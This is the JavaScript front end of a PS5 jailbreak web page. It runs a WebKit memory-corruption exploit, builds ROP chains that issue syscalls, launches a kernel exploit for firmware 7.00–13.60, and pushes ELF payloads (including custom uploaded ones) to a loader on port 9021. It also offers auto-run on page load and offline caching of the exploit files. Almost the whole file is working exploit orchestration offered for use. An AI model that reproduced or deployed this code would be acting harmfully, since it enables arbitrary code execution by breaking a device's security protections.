import { establishPrimitive } from "./webkit.js";
import { installWindowP } from "./utils/mem.js";

const output = document.getElementById("console");
const statusText = document.getElementById("statusText");
const statusLed = document.getElementById("statusLed");
const fwText = document.getElementById("fwText");
const runBtn = document.getElementById("runBtn");
const autoJbToggle = document.getElementById("autoJbToggle");
const elfldrChip = document.getElementById("elfldrChip");
const elfldrLed = document.getElementById("elfldrLed");
const elfldrText = document.getElementById("elfldrText");
const cacheChip = document.getElementById("cacheChip");
const cacheLed = document.getElementById("cacheLed");
const cacheText = document.getElementById("cacheText");
const resetCacheBtn = document.getElementById("resetCacheBtn");
const resetCacheLed = document.getElementById("resetCacheLed");
const resetCacheText = document.getElementById("resetCacheText");

// Auto-display detected firmware on load
if (fwText) {
  fwText.textContent = window.fw_str ? window.fw_str : "7.00 - 13.60";
}

function setStatus(text, state = "normal") {
  if (statusText) statusText.textContent = text;
  if (statusLed) {
    statusLed.className = "led";
    if (state === "running") statusLed.classList.add("led-yellow");
    else if (state === "success") statusLed.classList.add("led-green");
    else if (state === "error") statusLed.classList.add("led-red");
  }
}

function updateElfldrStatus(online) {
  if (elfldrLed) {
    elfldrLed.className = "led " + (online ? "led-green" : "led-yellow");
  }
  if (elfldrText) {
    elfldrText.textContent = "ELFLDR :9021 " + (online ? "(ACTIVE)" : "(IDLE)");
  }
}

function writeLog(message, type = "log", replace = false) {
  let line = replace ? output.lastElementChild : null;
  if (!line) {
    line = document.createElement("div");
    output.appendChild(line);
  }

  // Add color class based on message type
  if (type === "error") {
    line.className = "log-error";
  } else if (type === "success") {
    line.className = "log-success";
  } else {
    line.className = "log-info";
  }

  let marker = "*";
  if (type === "error") marker = "-";
  if (type === "info" || type === "success") marker = "+";
  line.textContent = `[${marker}] ${message}`;

  // Keep internal scroll at bottom without moving parent window scroll position
  if (output) {
    const prevWindowY = window.pageYOffset || document.documentElement.scrollTop || 0;
    output.scrollTop = output.scrollHeight;
    if ((window.pageYOffset || document.documentElement.scrollTop || 0) !== prevWindowY) {
      window.scrollTo(0, prevWindowY);
    }
  }
}

function writeEvent(name, detail, type) {
  writeLog(detail == null || detail === "" ? name : `${name}: ${detail}`,
    type || (name === "Failed" ? "error" : "log"));
}

window.writeLog = writeLog;
window.jb = { mark: writeEvent };

let ropInitPromise = null;
async function ensureRopRuntime() {
  if (window.ropRuntime && window.ropRuntime.p && window.ropRuntime.chain) {
    return window.ropRuntime;
  }
  if (ropInitPromise) {
    return await ropInitPromise;
  }
  ropInitPromise = (async () => {
    try {
      // Ensure offset file has finished parsing if loaded asynchronously
      if (typeof OFFSET_wk_host_constructor_candidates === "undefined") {
        for (let i = 0; i < 30; i++) {
          if (typeof OFFSET_wk_host_constructor_candidates !== "undefined") break;
          await new Promise((r) => setTimeout(r, 50));
        }
      }
      writeLog("Starting WebKit userland bridge...", "info");
      const primitive = await getPrimitive();
      writeLog(`WebKit base: 0x${getWebKitBase().toString(16)}`, "info");
      const { p, chain } = await window.prepareRop(primitive);
      window.ropRuntime = { p, chain };
      return window.ropRuntime;
    } finally {
      ropInitPromise = null;
    }
  })();
  return await ropInitPromise;
}

/* ---------- Pre-Flight ELF Loader Probing ---------- */
async function probeElfLoader(autoInit = false) {
  // 1. If hosted with local server (serve.py), probe the server's API
  try {
    const probeReq = await fetch("/api/probe", { cache: "no-store", signal: AbortSignal.timeout(1500) });
    if (probeReq.ok) {
      const data = await probeReq.json();
      if (data.online) {
        updateElfldrStatus(true);
        setStatus("JAILBROKEN", "success");
        if (runBtn) {
          runBtn.textContent = "JAILBROKEN";
          runBtn.classList.add("btn-success");
        }
        return { online: true };
      }
    }
  } catch (_) {
    // Local API not present or not running locally
  }

  // 2. If running on public host (e.g. GitHub Pages), verify via ROP socket
  let rop = window.ropRuntime;
  if (!rop || !rop.chain || !rop.p) {
    if (autoInit) {
      try {
        rop = await ensureRopRuntime();
      } catch (err) {
        updateElfldrStatus(false);
        return { online: false, reason: "WebKit userland bridge failed: " + err.message };
      }
    } else {
      updateElfldrStatus(false);
      return { online: false, reason: "Kernel exploit has not been run yet. Click RUN EXPLOIT first." };
    }
  }

  try {
    const { p, chain } = rop;
    const sockaddr = p.malloc(0x10);
    p.write1(sockaddr.add32(0x00), 0x10);
    p.write1(sockaddr.add32(0x01), 0x02);
    p.write2(sockaddr.add32(0x02), ((9021 & 0xff) << 8) | ((9021 >>> 8) & 0xff));
    p.write4(sockaddr.add32(0x04), 0x0100007f); // 127.0.0.1

    const sockRes = await chain.syscall(SYS_SOCKET, 2, 1, 0);
    const fd = sockRes.low;
    if (fd < 0) {
      updateElfldrStatus(false);
      return { online: false, reason: "Could not allocate local socket for probe." };
    }

    try {
      const connRes = await chain.syscall(SYS_CONNECT, fd, sockaddr, 0x10);
      if (connRes.low === 0) {
        updateElfldrStatus(true);
        setStatus("JAILBROKEN", "success");
        if (runBtn) {
          runBtn.textContent = "JAILBROKEN";
          runBtn.classList.add("btn-success");
        }
        return { online: true };
      } else {
        updateElfldrStatus(false);
        return { online: false, reason: "Connection to 127.0.0.1:9021 refused (elfldr not responding)." };
      }
    } finally {
      await chain.syscall(SYS_CLOSE, fd);
    }
  } catch (e) {
    updateElfldrStatus(false);
    return { online: false, reason: e.message || "Unknown socket error while probing 9021." };
  }
}

async function getPrimitive() {
  setStatus("STAGE 1: WEBKIT", "running");
  writeLog("Starting WebKit exploit");
  const primitive = installWindowP(await establishPrimitive(writeEvent));
  if (!primitive || typeof primitive.read8 !== "function")
    throw new Error("Memory primitive unavailable");

  writeLog("ARW ready", "success");
  return primitive;
}

function getWebKitBase() {
  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor !== "number" || typeof OFFSET_wk_host_constructor_candidates === "undefined")
    throw new Error("WebKit base inputs are unavailable");

  for (const offset of OFFSET_wk_host_constructor_candidates) {
    const base = ctor - offset;
    if (base >= 0x800000000 && base < 0x900000000 && base % 0x4000 === 0)
      return base;
  }

  throw new Error("WebKit base not found");
}

async function run() {
  if (runBtn) {
    runBtn.disabled = true;
    runBtn.textContent = "EXPLOITING...";
    runBtn.classList.remove("btn-success");
  }
  setStatus("INITIALIZING...", "running");

  const rejection = window.firmware.rejection();
  if (rejection)
    throw new Error(rejection);

  writeLog("Credits: Sonic_Iso, Jordy, ntfargo, ufm42, Dr. Yenyen, TheFlow, SlidyBat, Flatz, cow, nhk, bollarz, Sleirsgoevy, EchoStretch, EarthOnion", "info");
  writeLog(`Agent: ${navigator.userAgent}`, "info");
  writeLog(`Firmware: ${window.fw_str}`, "info");

  const rop = await ensureRopRuntime();

  // If elfldr is ALREADY running on port 9021, DO NOT run kernel exploit again!
  const probe = await probeElfLoader(false);
  if (probe.online) {
    writeLog("[+] System is ALREADY jailbroken! (elfldr active on port 9021)", "success");
    writeLog("[+] Kernel exploit skipped to protect system stability.", "info");
    writeLog("[+] Select any payload below to dispatch.", "info");
    setStatus("JAILBROKEN", "success");
    updateElfldrStatus(true);
    if (runBtn) {
      runBtn.textContent = "JAILBROKEN";
      runBtn.classList.add("btn-success");
      runBtn.disabled = false;
    }
    if (typeof window.showJbSuccessPopup === "function") {
      window.showJbSuccessPopup("Kernel Active &bull; elfldr :9021 Ready");
    }
    return;
  }

  setStatus("STAGE 2: KERNEL", "running");
  const { runKernelExploit } = await import("./relapse_exploit.js");
  const result = await runKernelExploit(rop.p, rop.chain, writeLog);
  if (!result || !result.done)
    throw new Error("Kernel exploit did not finish");

  writeLog("Kernel exploit complete! elfldr is listening on port 9021", "success");
  setStatus("JAILBROKEN", "success");
  updateElfldrStatus(true);
  if (runBtn) {
    runBtn.textContent = "JAILBROKEN";
    runBtn.classList.add("btn-success");
    runBtn.disabled = false;
  }
  if (typeof window.showJbSuccessPopup === "function") {
    window.showJbSuccessPopup("Kernel Active &bull; System Ready");
  }
}

function handleRunError(error) {
  const msg = error instanceof Error ? error.message : String(error);
  writeLog(msg, "error");
  setStatus("FAILED", "error");
  if (runBtn) {
    runBtn.disabled = false;
    runBtn.textContent = "RETRY EXPLOIT";
  }
}

if (runBtn) {
  runBtn.addEventListener("click", () => {
    run().catch(handleRunError);
  });
}

/* ---------- Auto-Run on Load ---------- */
let autoRunTimer = null;
const isAutoRun = localStorage.getItem("lonely_auto_run") === "1";

if (autoJbToggle) {
  autoJbToggle.checked = isAutoRun;
  autoJbToggle.addEventListener("change", (e) => {
    const enabled = e.target.checked;
    localStorage.setItem("lonely_auto_run", enabled ? "1" : "0");
    writeLog(enabled ? "Auto-run enabled for future visits." : "Auto-run disabled.", "info");
  });
}

if (isAutoRun && runBtn && !runBtn.disabled) {
  let countdown = 3;
  writeLog(`Auto-run enabled. Starting in ${countdown}s... (Click button to cancel)`, "info");
  runBtn.textContent = `STARTING IN ${countdown}s (CANCEL)`;

  const cancelAutoRun = () => {
    if (autoRunTimer) {
      clearInterval(autoRunTimer);
      autoRunTimer = null;
      runBtn.textContent = "RUN EXPLOIT";
      writeLog("Auto-run cancelled by user.", "info");
    }
  };

  runBtn.addEventListener("click", cancelAutoRun, { once: true });

  autoRunTimer = setInterval(() => {
    countdown--;
    if (countdown > 0) {
      runBtn.textContent = `STARTING IN ${countdown}s (CANCEL)`;
    } else {
      clearInterval(autoRunTimer);
      autoRunTimer = null;
      runBtn.removeEventListener("click", cancelAutoRun);
      run().catch(handleRunError);
    }
  }, 1000);
}

/* ---------- Dual-Mode Payload Dispatcher ---------- */
async function sendPayloadViaRop(bytes, payloadName) {
  const rop = window.ropRuntime;
  if (!rop || !rop.chain || !rop.p) {
    throw new Error("ROP runtime unavailable. Run the exploit first.");
  }
  const { p, chain } = rop;
  // sockaddr_in for 127.0.0.1:9021
  const sockaddr = p.malloc(0x10);
  p.write1(sockaddr.add32(0x00), 0x10); // len
  p.write1(sockaddr.add32(0x01), 0x02); // AF_INET
  p.write2(sockaddr.add32(0x02), ((9021 & 0xff) << 8) | ((9021 >>> 8) & 0xff)); // htons(9021)
  p.write4(sockaddr.add32(0x04), 0x0100007f); // 127.0.0.1 in network byte order

  const sockRes = await chain.syscall(SYS_SOCKET, 2, 1, 0);
  const fd = sockRes.low;
  if (fd < 0) throw new Error("Socket creation failed");

  try {
    const connRes = await chain.syscall(SYS_CONNECT, fd, sockaddr, 0x10);
    if (connRes.low !== 0) throw new Error("Could not connect to 127.0.0.1:9021 (is elfldr running?)");

    // Send payload in 16KB blocks
    const CHUNK_SIZE = 16384;
    const chunkBuf = p.malloc(CHUNK_SIZE);
    let sent = 0;
    while (sent < bytes.length) {
      const len = Math.min(CHUNK_SIZE, bytes.length - sent);
      for (let i = 0; i < len; i++) {
        p.write1(chunkBuf.add32(i), bytes[sent + i]);
      }
      const writeRes = await chain.syscall(SYS_WRITE, fd, chunkBuf, len);
      if (writeRes.low <= 0) throw new Error("Write failed at byte " + sent);
      sent += len;
    }
  } finally {
    await chain.syscall(SYS_CLOSE, fd);
  }
  return true;
}

async function dispatchPayload(payloadName, btn) {
  if (btn) {
    btn.dataset.state = "sending";
    btn.textContent = "PROBING...";
  }

  // Pre-flight check: is port 9021 active? Auto-initializes userland bridge if needed!
  const probe = await probeElfLoader(true);
  if (!probe.online) {
    writeLog(`Pre-flight probe failed: ${probe.reason}`, "error");
    if (btn) {
      btn.dataset.state = "failed";
      btn.textContent = "NOT READY";
      setTimeout(() => {
        btn.dataset.state = "idle";
        btn.textContent = "SEND";
      }, 3000);
    }
    return;
  }

  if (btn) {
    btn.textContent = "SENDING...";
  }

  writeLog(`Dispatching ${payloadName} to elfldr (port 9021)...`, "info");

  try {
    let ok = false;
    let msg = "";

    // 1. Try host server API (works when hosted locally via serve.py)
    try {
      const response = await fetch("/api/send-payload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ payload: payloadName })
      });
      if (response.ok) {
        const data = await response.json();
        ok = data.ok;
        msg = data.message;
      }
    } catch (_) {
      // API not available (e.g. running on GitHub Pages / static host)
    }

    // 2. If API was unavailable or running on a static host, dispatch in-browser via ROP socket
    if (!ok) {
      const elfResp = await fetch("./payloads/" + encodeURIComponent(payloadName), { cache: "no-store" });
      if (!elfResp.ok) throw new Error("Failed to load payload file from host: HTTP " + elfResp.status);
      const bytes = new Uint8Array(await elfResp.arrayBuffer());
      await sendPayloadViaRop(bytes, payloadName);
      ok = true;
      msg = `Sent ${payloadName} directly to 127.0.0.1:9021`;
    }

    if (ok) {
      writeLog(msg, "success");
      if (btn) {
        btn.dataset.state = "sent";
        btn.textContent = "SENT";
      }
      if (typeof window.showJbSuccessPopup === "function") {
        window.showJbSuccessPopup(`${payloadName} Active &bull; System Ready`);
      }
    }
  } catch (err) {
    writeLog(`Payload dispatch failed: ${err.message}`, "error");
    if (btn) {
      btn.dataset.state = "failed";
      btn.textContent = "FAILED";
    }
  }

  if (btn) {
    setTimeout(() => {
      btn.dataset.state = "idle";
      btn.textContent = "SEND";
    }, 3500);
  }
}

// Attach listeners to all payload send buttons
document.querySelectorAll(".btn-send").forEach((btn) => {
  btn.addEventListener("click", () => {
    const payload = btn.getAttribute("data-payload");
    if (payload) {
      dispatchPayload(payload, btn);
    }
  });
});

/* ---------- Offline Cache System (Service Worker & Cache API) ---------- */
async function initOfflineCache() {
  if ("serviceWorker" in navigator) {
    try {
      const reg = await navigator.serviceWorker.register("./sw.js");
      if (reg.active) {
        if (cacheLed) cacheLed.className = "led led-green";
        if (cacheText) cacheText.textContent = "CACHE: READY (OFFLINE)";
      }
      reg.addEventListener("updatefound", () => {
        const worker = reg.installing;
        worker.addEventListener("statechange", () => {
          if (worker.state === "installed" && navigator.serviceWorker.controller) {
            writeLog("Offline cache updated! Host is ready for offline use.", "success");
            if (cacheLed) cacheLed.className = "led led-green";
            if (cacheText) cacheText.textContent = "CACHE: READY (OFFLINE)";
          }
        });
      });
    } catch (e) {
      console.warn("ServiceWorker registration:", e);
    }
  }

  // AppCache fallback for older PS5 WebKit
  if (window.applicationCache) {
    window.applicationCache.addEventListener("updateready", () => {
      if (window.applicationCache.status === window.applicationCache.UPDATEREADY) {
        window.applicationCache.swapCache();
        writeLog("AppCache updated for offline use.", "success");
        if (cacheLed) cacheLed.className = "led led-green";
        if (cacheText) cacheText.textContent = "CACHE: READY (OFFLINE)";
      }
    });
    if (window.applicationCache.status === window.applicationCache.IDLE) {
      if (cacheLed) cacheLed.className = "led led-green";
      if (cacheText) cacheText.textContent = "CACHE: READY (OFFLINE)";
    }
  }
}

if (cacheChip) {
  cacheChip.addEventListener("click", async () => {
    writeLog("Initiating full offline cache download...", "info");
    if (cacheText) cacheText.textContent = "CACHING...";
    if (cacheLed) cacheLed.className = "led led-yellow";

    if ("caches" in window) {
      try {
        const cache = await caches.open("lonely-ps5-v2.7");
        const urlsToCache = [
          "./",
          "./index.html",
          "./prestige.jpg",
          "./src/firmware.js",
          "./src/main.js",
          "./src/rop.js",
          "./src/site.js",
          "./src/webkit.js",
          "./src/kexp.js",
          "./src/relapse_exploit.js",
          "./src/utils/mem.js",
          "./src/utils/int64.js",
          "./src/utils/syscalls.js",
          "./src/utils/rop_slave.js",
          "./payloads/nexHEN.elf",
          "./payloads/zftpd-ps5.elf",
          "./payloads/MemDBG-ps5.elf",
          "./payloads/klogsrv-ps5.elf",
          "./payloads/shsrv-ps5.elf",
          "./payloads/websrv-ps5.elf",
          "./payloads/gdbsrv-ps5.elf",
          "./payloads/betterlan-ps5.elf",
          "./payloads/elfldr-ps5-1360.elf",
          "./payloads/kexp_2026_05_25.bin"
        ];
        let count = 0;
        for (const u of urlsToCache) {
          try {
            await cache.add(u);
            count++;
          } catch (_) {}
        }
        writeLog(`Offline cache complete: ${count}/${urlsToCache.length} core assets saved.`, "success");
        if (cacheLed) cacheLed.className = "led led-green";
        if (cacheText) cacheText.textContent = "CACHE: READY (OFFLINE)";
      } catch (err) {
        writeLog(`Caching failed: ${err.message}`, "error");
        if (cacheLed) cacheLed.className = "led led-red";
        if (cacheText) cacheText.textContent = "CACHE FAILED";
      }
    } else {
      writeLog("Browser Cache API not supported on this userland.", "error");
    }
  });
}

if (resetCacheBtn) {
  resetCacheBtn.addEventListener("click", async () => {
    if (resetCacheText) resetCacheText.textContent = "RESETTING...";
    if (resetCacheLed) resetCacheLed.className = "led led-yellow";
    writeLog("Clearing offline caches and service worker...", "warn");

    try {
      // 1. Delete all CacheStorage entries
      if ("caches" in window) {
        const keys = await caches.keys();
        for (const key of keys) {
          await caches.delete(key);
        }
      }

      // 2. Unregister all service workers
      if ("serviceWorker" in navigator) {
        const regs = await navigator.serviceWorker.getRegistrations();
        for (const reg of regs) {
          await reg.unregister();
        }
      }

      // 3. Clear storage (preserve auto-run setting)
      const autoJbPref = localStorage.getItem("lonely_ps5_autojb");
      localStorage.clear();
      sessionStorage.clear();
      if (autoJbPref !== null) {
        localStorage.setItem("lonely_ps5_autojb", autoJbPref);
      }

      if (resetCacheText) resetCacheText.textContent = "CLEARED!";
      if (resetCacheLed) resetCacheLed.className = "led led-green";
      writeLog("Cache cleared! Reloading fresh from server...", "success");

      setTimeout(() => {
        const baseUrl = window.location.origin + window.location.pathname;
        window.location.replace(baseUrl + "?nocache=" + Date.now());
      }, 700);
    } catch (err) {
      writeLog(`Failed to reset cache: ${err.message}`, "error");
      if (resetCacheText) resetCacheText.textContent = "RESET ERROR";
      if (resetCacheLed) resetCacheLed.className = "led led-red";
    }
  });
}

initOfflineCache();


/* ==========================================================================
   Background & Panel Glass Opacity Manager
   Allows user to edit opacity on the "square" covering the background
   ========================================================================== */
const glassToggleBtn = document.getElementById("glassToggleBtn");
const OPACITY_PRESETS = [
  { label: "25% (CLEAR)", panelOpacity: "0.25", bgDim: "0.15" },
  { label: "50% (BALANCED)", panelOpacity: "0.50", bgDim: "0.28" },
  { label: "75% (DEEP)", panelOpacity: "0.75", bgDim: "0.45" },
  { label: "95% (SOLID)", panelOpacity: "0.95", bgDim: "0.75" }
];

let currentOpacityIdx = 1; // Default to 50% Balanced

function applyOpacityPreset(idx, save = true) {
  currentOpacityIdx = (idx + OPACITY_PRESETS.length) % OPACITY_PRESETS.length;
  const preset = OPACITY_PRESETS[currentOpacityIdx];

  document.documentElement.style.setProperty("--panel-opacity", preset.panelOpacity);
  document.documentElement.style.setProperty("--bg-dim-opacity", preset.bgDim);

  if (glassToggleBtn) {
    glassToggleBtn.textContent = `◐ GLASS: ${preset.label}`;
  }

  if (save) {
    localStorage.setItem("lonely_panel_opacity_idx", String(currentOpacityIdx));
  }
}

// Load saved opacity preference
const savedOpacityIdx = localStorage.getItem("lonely_panel_opacity_idx");
if (savedOpacityIdx !== null && !isNaN(parseInt(savedOpacityIdx, 10))) {
  applyOpacityPreset(parseInt(savedOpacityIdx, 10), false);
} else {
  applyOpacityPreset(1, false);
}

if (glassToggleBtn) {
  glassToggleBtn.addEventListener("click", () => {
    applyOpacityPreset(currentOpacityIdx + 1, true);
  });
}

/* ==========================================================================
   Valkyrie Forge: Custom Payload Drag & Drop / File Picker Loader
   ========================================================================== */
function initCustomPayloadDrop() {
  const dropZone = document.getElementById("customDropZone");
  const fileInput = document.getElementById("customFileInput");
  const statusEl = document.getElementById("customDropStatus");

  if (!dropZone || !fileInput) return;

  function updateStatus(text, isError = false) {
    if (statusEl) {
      statusEl.textContent = text;
      statusEl.style.color = isError ? "var(--gow-crimson-bright)" : "var(--gow-frost)";
    }
  }

  async function handleFile(file) {
    if (!file) return;
    updateStatus(`Forging ${file.name} (${Math.round(file.size / 1024)} KB)...`);
    writeLog(`[Valkyrie Forge] Reading custom payload: ${file.name}...`, "info");
    
    try {
      const arrayBuffer = await file.arrayBuffer();
      const bytes = new Uint8Array(arrayBuffer);

      updateStatus(`Dispatching ${file.name} to 127.0.0.1:9021...`);
      await sendPayloadViaRop(bytes, file.name);

      updateStatus(`⚔ ${file.name} dispatched successfully!`);
      writeLog(`[Valkyrie Forge] Successfully delivered ${file.name} to ELFLDR on port 9021!`, "success");
      
      if (typeof window.showJbSuccessPopup === "function") {
        window.showJbSuccessPopup(`${file.name} Dispatched via Valkyrie Forge`);
      }
    } catch (err) {
      updateStatus(`Failed: ${err.message}`, true);
      writeLog(`[Valkyrie Forge] Payload dispatch failed: ${err.message}`, "error");
    }
  }

  dropZone.addEventListener("click", () => {
    fileInput.click();
  });

  fileInput.addEventListener("change", (e) => {
    if (e.target.files && e.target.files.length > 0) {
      handleFile(e.target.files[0]);
    }
  });

  dropZone.addEventListener("dragover", (e) => {
    e.preventDefault();
    dropZone.classList.add("drop-active");
  });

  dropZone.addEventListener("dragleave", (e) => {
    e.preventDefault();
    dropZone.classList.remove("drop-active");
  });

  dropZone.addEventListener("drop", (e) => {
    e.preventDefault();
    dropZone.classList.remove("drop-active");
    if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
      handleFile(e.dataTransfer.files[0]);
    }
  });
}

initCustomPayloadDrop();

/* ==========================================================================
   Firmware Quick-Switcher / Override Helper
   ========================================================================== */
const fwChip = document.getElementById("fwChip");
if (fwChip) {
  fwChip.addEventListener("click", () => {
    const supported = ["7.00", "7.01", "7.20", "7.40", "7.60", "7.61", "8.00", "8.20", "8.40", "8.60", "9.00", "9.20", "9.40", "9.60", "10.00", "10.01", "10.20", "10.40", "10.60", "11.00", "11.20", "11.60", "12.00", "12.02", "12.20", "12.40", "12.60", "12.70", "13.00", "13.20", "13.40", "13.42", "13.60"];
    const choice = prompt(`Manual Firmware Override:\nCurrent: ${window.fw_str || "Auto"}\n\nEnter supported version (e.g. 7.61, 8.00, 10.00, or 'auto'):`);
    if (choice) {
      const clean = choice.trim().toLowerCase();
      if (clean === "auto") {
        delete window.fw_override;
        localStorage.removeItem("lonely_fw_override");
        writeLog("Firmware set to Auto-Detect.", "info");
      } else if (supported.includes(clean)) {
        window.fw_override = clean;
        localStorage.setItem("lonely_fw_override", clean);
        if (fwText) fwText.textContent = clean + " (OVERRIDE)";
        writeLog(`Firmware manually overridden to FW ${clean}.`, "success");
      } else {
        alert(`Unsupported firmware: ${choice}. Supported range: 7.00 - 13.60.`);
      }
    }
  });

  // Restore stored override
  const storedOverride = localStorage.getItem("lonely_fw_override");
  if (storedOverride) {
    window.fw_override = storedOverride;
    if (fwText) fwText.textContent = storedOverride + " (OVERRIDE)";
  }
}
